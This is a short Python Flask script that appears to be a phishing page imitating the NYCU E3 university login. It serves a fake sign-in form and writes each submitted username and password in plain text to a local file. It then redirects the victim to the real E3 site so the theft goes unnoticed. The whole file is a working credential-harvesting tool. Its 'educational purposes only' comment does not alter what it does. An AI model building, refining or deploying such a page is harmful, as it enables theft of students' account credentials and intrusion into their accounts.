from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# 1. This route loads your HTML page when you visit http://127.0.0.1:5000/
@app.route('/')
def home():
    return render_template('e3.html')

# 2. This route catches the form data when you click "帳號登入"
@app.route('/login', methods=['POST'])
def login():
    # Get the data from the form using the 'name' attributes
    user_account = request.form.get('username')
    user_password = request.form.get('password')

    # Save the data to a text file (EDUCATIONAL PURPOSES ONLY)
    with open('users_data.txt', 'a', encoding='utf-8') as file:
        file.write(f"Account: {user_account} | Password: {user_password}\n")

    # Redirect the user to another page (e.g., the actual E3 system or a success page)
    return redirect('https://e3.nycu.edu.tw/') 

if __name__ == '__main__':
    # Run the server
    app.run(debug=True)